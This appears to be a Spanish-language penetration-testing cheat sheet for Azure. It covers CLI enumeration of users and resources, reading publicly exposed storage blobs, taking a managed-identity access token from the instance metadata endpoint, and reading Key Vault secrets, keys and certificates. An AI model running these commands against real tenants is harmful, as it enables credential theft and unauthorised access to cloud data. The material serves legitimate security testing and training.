# Azure -- Ataques y Misconfiguraciones

---

## Configuracion inicial

```bash
# Login
az login
az login --service-principal -u CLIENT_ID -p SECRET --tenant TENANT_ID

# Informacion de la cuenta
az account show
az account list

# Cambiar suscripcion
az account set --subscription SUBSCRIPTION_ID
```

---

## Enumeracion

```bash
# Usuarios y grupos
az ad user list --output table
az ad group list --output table
az ad sp list --all --output table  # Service Principals

# Recursos
az resource list --output table
az vm list --output table
az storage account list --output table
az keyvault list --output table
az functionapp list --output table

# Permisos del usuario actual
az role assignment list --all
az role definition list
```

---

## Azure Storage -- Misconfiguraciones

```bash
# Listar storage accounts
az storage account list --output table

# Verificar acceso publico
az storage account show --name NOMBRE --query "allowBlobPublicAccess"

# Acceso publico (sin credenciales)
curl -s "https://CUENTA.blob.core.windows.net/CONTENEDOR?restype=container&comp=list"

# Con credenciales -- listar contenedores
az storage container list --account-name CUENTA
az storage blob list --container-name CONTENEDOR --account-name CUENTA

# Descargar blob
az storage blob download --container-name CONTENEDOR --name archivo.txt     --file archivo.txt --account-name CUENTA
```

---

## Managed Identity Abuse

```bash
# Si la VM tiene Managed Identity asignada
# Desde la VM -> obtener token sin credenciales
curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"     -H "Metadata: true"

# Usar el token para acceder a recursos Azure
TOKEN=$(curl -s ... | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
curl -H "Authorization: Bearer $TOKEN"     "https://management.azure.com/subscriptions/SUB_ID/resources?api-version=2021-04-01"
```

---

## Azure Key Vault

```bash
# Listar Key Vaults
az keyvault list

# Listar secretos (si tenemos permisos)
az keyvault secret list --vault-name NOMBRE

# Leer un secreto
az keyvault secret show --vault-name NOMBRE --name SECRETO

# Listar certificados y claves
az keyvault certificate list --vault-name NOMBRE
az keyvault key list --vault-name NOMBRE
```
